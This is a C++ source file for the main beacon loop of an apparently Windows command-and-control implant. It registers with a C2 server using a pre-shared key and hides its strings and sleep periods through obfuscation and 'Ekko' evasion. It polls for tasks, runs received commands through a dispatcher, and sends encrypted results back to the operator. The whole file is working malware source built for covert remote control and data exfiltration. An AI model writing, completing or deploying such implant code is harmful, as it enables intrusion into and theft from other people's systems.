#include "Beacon.h"

#include "Chunked.h"
#include "Config.h"
#include "Crypto.h"
#include "Protocol.h"
#include "StageLog.h"
#include "evasive/Opsec.h"
#include "evasive/SleepEkko.h"
#include "evasive/Strings.h"
#include "tasks/Runner.h"
#include "transport/Profile.h"

#include <windows.h>

#include <random>
#include <string>
#include <string_view>
#include <vector>

namespace beacon {

namespace {

std::string re(std::string_view id, std::string_view r) {
    auto pfx = OBF_KEEP("RESULT:");
    return std::string(pfx.c_str()) + std::string(id) + ":" + std::string(r);
}

void sj(std::uint32_t s, std::uint32_t j) {
    std::random_device rd;
    std::mt19937 g(rd());
    std::uniform_int_distribution<std::uint32_t> d(0, j ? j : 1);
    ekko::sleep(s + d(g));
}

bool do_register(const char* psk, proto::Session& ss) {
    for (int i = 0; i < 8; ++i) {
        if (proto::register_agent(psk, ss)) return true;
        C2_STAGE("register-fail");
        Sleep(500);
    }
    return false;
}

std::uint32_t backoff_ms(int fails) {
    if (fails <= 0) return 1000;
    std::uint32_t ms = 1000u << static_cast<std::uint32_t>((fails > 8) ? 8 : fails);
    constexpr std::uint32_t kCap = 5u * 60u * 1000u;
    return ms > kCap ? kCap : ms;
}

} // namespace

void run() {
    auto po = OBF_KEEP(C2_PSK);
    const char* psk = po.c_str();
    C2_STAGE("tx-init");
    if (!tx::init()) { C2_STAGE("tx-init-fail"); return; }

    proto::Session ss;
    if (!do_register(psk, ss)) { C2_STAGE("register-giveup"); return; }
    C2_STAGE("register-ok");
    if (ss.session_key.size() != 32) { C2_STAGE("bad-session-key"); return; }
    std::uint8_t k[32];
    memcpy(k, ss.session_key.data(), 32);

#ifndef C2_EARLY_EVASION
    C2_STAGE("post-checkin");
    opsec::post_checkin();
#endif

    C2_STAGE("beacon-loop");
    std::uint32_t iv = cfg::kBeaconIntervalSec;
    int consec_fail = 0;

    auto hb = OBF_KEEP("HEARTBEAT");
    auto nop = OBF_KEEP("NOP");
    auto task = OBF_KEEP("TASK:");

    for (;;) {
        std::string eh = proto::encrypt_payload(hb.c_str(), k);
        auto br = proto::beacon_ex(ss.agent_id, k, eh);

        if (br.status == proto::BeaconStatus::UnknownAgent) {
            C2_STAGE("unknown-agent-reregister");
            consec_fail = 0;
            if (!do_register(psk, ss) || ss.session_key.size() != 32) {
                C2_STAGE("reregister-fail");
                Sleep(backoff_ms(++consec_fail));
                continue;
            }
            memcpy(k, ss.session_key.data(), 32);
            C2_STAGE("reregister-ok");
            sj(iv, cfg::kBeaconJitterSec);
            continue;
        }

        if (br.status != proto::BeaconStatus::Ok) {
            ++consec_fail;
            C2_STAGE("beacon-fail");
            Sleep(backoff_ms(consec_fail));
            continue;
        }
        consec_fail = 0;

        std::string rp = br.payload;
        if (rp.empty() || rp == nop.c_str()) { sj(iv, cfg::kBeaconJitterSec); continue; }

        if (rp.compare(0, 5, task.c_str()) == 0) {
            auto f = rp.find(':', 5);
            if (f == std::string::npos) { sj(iv, cfg::kBeaconJitterSec); continue; }
            std::string id = rp.substr(5, f - 5);
            std::string cl = rp.substr(f + 1);

            std::vector<std::string> parts, args;
            std::string cur;
            for (char c : cl) {
                if (c == ' ') { if (!cur.empty()) { parts.push_back(cur); cur.clear(); } }
                else cur.push_back(c);
            }
            if (!cur.empty()) parts.push_back(cur);
            std::string cmd = parts.empty() ? "" : parts[0];
            if (parts.size() > 1) args.assign(parts.begin() + 1, parts.end());

            std::string res;
            bool ex = runner::dispatch(ss.agent_id, cmd, args, res, iv, k);
            std::string env = re(id, res);
            if (env.size() > chunked::k_chunk_size) {
                chunked::send_result(ss.agent_id, k, id, res);
            } else {
                std::string er = proto::encrypt_payload(env, k);
                proto::beacon_ex(ss.agent_id, k, er);
            }
            if (ex) { Sleep(500); return; }
        }
        sj(iv, cfg::kBeaconJitterSec);
    }
}

} // namespace beacon
